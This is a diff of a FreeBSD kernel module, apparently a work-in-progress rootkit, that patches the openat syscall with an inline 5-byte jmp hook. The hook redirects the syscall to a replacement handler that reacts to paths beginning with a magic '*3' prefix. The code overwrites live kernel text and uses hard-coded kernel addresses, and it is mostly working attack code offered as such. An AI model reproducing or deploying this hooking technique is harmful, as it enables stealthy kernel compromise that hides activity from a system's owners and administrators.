@@ -35,11 +35,8 @@ new_sy_call(struct thread *td, void *syscall_args) {
         mode_t mode;
     };
 
-    struct sc_args *args;
-    char * str;
-
     get_pc_ecx();
-    __asm__ volatile ("addl $33, %ecx"); // TODO get exact value to add
+    __asm__ volatile ("addl $30, %ecx"); // TODO get exact value to add
     __asm__ volatile ("push %ecx"); // push return address
 
     // sy_call_t *openat_sy_call = (sy_call_t *)(0xc0c42820 + 5);                 
@@ -51,9 +48,24 @@ new_sy_call(struct thread *td, void *syscall_args) {
     __asm__ volatile ("push %edi");
     __asm__ volatile ("push %esi");
 
-    // TODO insert jmp to old syscall + 8,
+    // old_sy_call: 0xc0c42820
+    __asm__ volatile ("movl 0xc0c42825, %ecx");
+    __asm__ volatile ("jmp *%ecx");
+
+    // TODO insert jmp to old syscall + 5,
     // when old sys call returns, its retval will be in eax.
 
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
     __asm__ volatile ("nop");
     __asm__ volatile ("nop");
     __asm__ volatile ("nop");
@@ -78,8 +90,8 @@ new_sy_call(struct thread *td, void *syscall_args) {
         goto returnlabel;
     }                                                                         
 
-    args = (struct sc_args *) syscall_args;                   
-    str = args->path;                                                  
+    struct sc_args *args = (struct sc_args *) syscall_args;                   
+    char *str = args->path;                                                  
 
     if (str[0] == '*' &&                                                      
         str[1] == '3' &&                                                      
@@ -113,11 +125,23 @@ p32(uint8_t bytes[], void *addr) {
 
 static void
 craft_jmphook(uint8_t jmphook[], void *src, void *dest) {
+
     // jump near, relative, displacement relative to next instruction
     jmphook[0] = 0xe9;
     // subtract 5 because this relative jmp is 5 bytes long,
     // and the jmp is relative to the next instruction.
     p32(&(jmphook[1]), (void *) ((char *)dest - (char *)src - 5));
+}
+
+static void
+overwrite_jmphook(uint8_t jmphook[], void *void_addr) {
+
+    char *addr = (char *)void_addr;
+    addr[0] = jmphook[0];
+    addr[1] = jmphook[1];
+    addr[2] = jmphook[2];
+    addr[3] = jmphook[3];
+    addr[4] = jmphook[4];
 }
 
 static int
@@ -126,47 +150,17 @@ load(struct module *module, int cmd, void *arg) {
     switch (cmd) {
     case MOD_LOAD: {
 
-        char *old_sy_call = (char *) sysent[SYS_openat].sy_call;
-
-        // The type argument is used to perform statistics on memory usage, and for
-        // basic sanity checks.  It can be used to identify multiple allocations.
-        // The statistics can be examined by `vmstat -m'.
-        //
-        // Three malloc types MALLOC_DECLAREd in /sys/sys/malloc.h
-        // and MALLOC_DEFINEd in /sys/kern/kern_malloc.c
-        //
-        // M_CACHE - various dynamically allocated caches
-        // M_DEVBUF - device driver memory
-        // M_TEMP - misc temporary data buffers
-        //
-        // TODO choose which malloc type to use
-        char *malloc_addr = malloc(1024ul, M_DEVBUF, M_ZERO | M_NOWAIT | M_USE_RESERVE);
-        if (malloc_addr == NULL) {
-            printf("\nmalloc unsuccessful\n");
-            return (0);
-        }
-
+        char *old_sy_call = (char *)sysent[SYS_openat].sy_call;
+        char *malloc_addr = malloc(1024ul, M_TEMP, M_NOWAIT | M_USE_RESERVE);
 
         uint8_t jmphook[5];
         craft_jmphook(jmphook, old_sy_call, malloc_addr);
-        /*
-
-        old_sy_call[0] = jmphook[0];
-        old_sy_call[1] = jmphook[1];
-        old_sy_call[2] = jmphook[2];
-        old_sy_call[3] = jmphook[3];
-        old_sy_call[4] = jmphook[4];
-        */
-
-        // int ret = vm_map_protect(curproc->p_vmspace->vm_map, 
+        overwrite_jmphook(jmphook, old_sy_call);
 
         printf("\njmp hook instr bytes: %x %x %x %x %x\n", jmphook[0], jmphook[1], jmphook[2], jmphook[3], jmphook[4]);
         printf("old_sy_call: %p\n", old_sy_call);
-        // printf("%p\n", new_sy_call);
+        printf("new_sy_call: %p\n", new_sy_call);
         printf("malloc: %p\n", malloc_addr);
-
-        /* redirect the entry to point to the new syscall handler. */
-        // curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
 
         break;
     }
